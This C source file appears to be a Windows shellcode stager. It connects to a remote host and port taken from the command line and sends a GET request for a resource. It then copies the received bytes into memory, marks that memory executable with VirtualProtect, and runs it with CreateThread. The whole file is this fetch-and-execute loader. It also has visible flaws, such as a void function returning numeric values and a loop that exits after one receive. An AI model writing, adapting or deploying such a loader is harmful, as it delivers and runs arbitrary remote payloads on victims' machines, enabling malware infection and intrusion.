#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>


#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 4096

void getShellcode_Run(char* host, char* port, char* resource) {

    DWORD oldp = 0;
    BOOL returnValue;

    size_t origsize = strlen(host) + 1;
    const size_t newsize = 100;
    size_t convertedChars = 0;
    wchar_t Whost[newsize];
    mbstowcs_s(&convertedChars, Whost, origsize, host, _TRUNCATE);


    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    char sendbuf[MAX_PATH] = "";
    lstrcatA(sendbuf, "GET /");
    lstrcatA(sendbuf, resource);

    char recvbuf[DEFAULT_BUFLEN];
    memset(recvbuf, 0, DEFAULT_BUFLEN);
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed wuith error123: %d\n", iResult);
        return ;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = PF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(host, port, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return ;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return ;
        }

        // Connect to server.
        printf("[+] Connect to %s:%s", host, port);
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return ;
    }

    // Send an initial buffer
    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return ;
    }

    printf("\n[+] Sent %ld Bytes\n", iResult);
    
    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return ;
    }
    
    // Receive until the peer closes the connection
    do {

        iResult = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);
        if (iResult > 0)
            printf("[+] Received %d Bytes\n", iResult);
        else if (iResult == 0)
            printf("[+] Connection closed\n");
        else
            printf("recv failed with error: %d\n", WSAGetLastError());


        LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(recvbuf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!alloc_mem) {
		printf("Failed to Allocate memory (%u)\n", GetLastError());
		return -1;
	}
	
	MoveMemory(alloc_mem, recvbuf, sizeof(recvbuf));
	//RtlMoveMemory(alloc_mem, payload, sizeof(payload));


	DWORD oldProtect;

	if (!VirtualProtect(alloc_mem, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect)) {
		printf("Failed to change memory protection (%u)\n", GetLastError());
		return -2;
	}


	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if (!tHandle) {
		printf("Failed to Create the thread (%u)\n", GetLastError());
		return -3;
	}

	printf("\n\nalloc_mem : %p\n", alloc_mem);
	WaitForSingleObject(tHandle, INFINITE);
	getchar();
	// or

	//((void(*)())alloc_mem)();

	return 0;


    } while (iResult > 0);

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();
}

int main(int argc, char** argv) {

    // Validate the parameters
    if (argc != 4) {
        printf("[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\n", argv[0]);
        return 1;
    }

    getShellcode_Run(argv[1], argv[2], argv[3]);

    return 0;

}
